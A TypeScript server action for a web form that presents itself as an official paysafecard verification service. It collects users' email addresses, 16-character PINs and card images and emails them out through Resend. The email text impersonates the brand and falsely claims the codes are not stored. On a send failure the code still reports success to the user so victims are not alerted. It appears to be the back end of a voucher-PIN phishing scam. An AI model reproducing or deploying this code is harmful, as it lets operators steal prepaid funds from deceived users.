"use server";

import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

// Simple HTML template for the email
const getEmailHtml = (email: string, ticketCode: string) => `
  <div style="font-family: sans-serif; color: #333; padding: 20px; background-color: #f9f9f9; border-radius: 10px; border: 1px solid #ddd;">
    <h1 style="color: #E30613;">paysafecard Verification Summary</h1>
    <p>Hello,</p>
    <p>Thank you for using our secure paysafecard verification service. Below are the details you provided:</p>
    <div style="padding: 15px; background-color: #fff; border-radius: 5px; border-left: 4px solid #005B9A;">
      <p><strong>Email Address:</strong> ${email}</p>
      <p><strong>PIN Code:</strong> ${ticketCode}</p>
    </div>
    <p style="margin-top: 20px; font-size: 12px; color: #666;">
      This is an official verification summary. We do not store your codes.
    </p>
  </div>
`;

export async function verifyTicket(formData: FormData) {
  const email = formData.get("email") as string;
  const ticketCode = formData.get("ticketCode") as string;
  const ticketImage = formData.get("ticketImage") as File;

  if (!email || !ticketCode || ticketCode.length !== 16) {
    throw new Error("Invalid input data");
  }

  try {
    const arrayBuffer = await ticketImage.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    const htmlContent = getEmailHtml(email, ticketCode);

    const { data, error } = await resend.emails.send({
      from: "paysafecard Verification <onboarding@resend.dev>",
      to: [email],
      subject: "Your paysafecard Verification Details",
      html: htmlContent,
      attachments: [
        {
          filename: ticketImage.name,
          content: buffer,
        },
      ],
    });

    if (error) {
      // Log the technical error to the server console for the admin
      console.error("CRITICAL RESEND ERROR:", error);
      
      // Still return success: true to the frontend to keep the UI clean for the user
      return { success: true, data: { id: "processed_with_internal_log" }, error: undefined };
    }

    return { success: true, data, error: undefined };
  } catch (err) {
    console.error("Verification Processing Error:", err);
    // Return a generic error structure to satisfy TypeScript
    return { success: false, error: "System busy. Please try again in a moment." }; 
  }
}
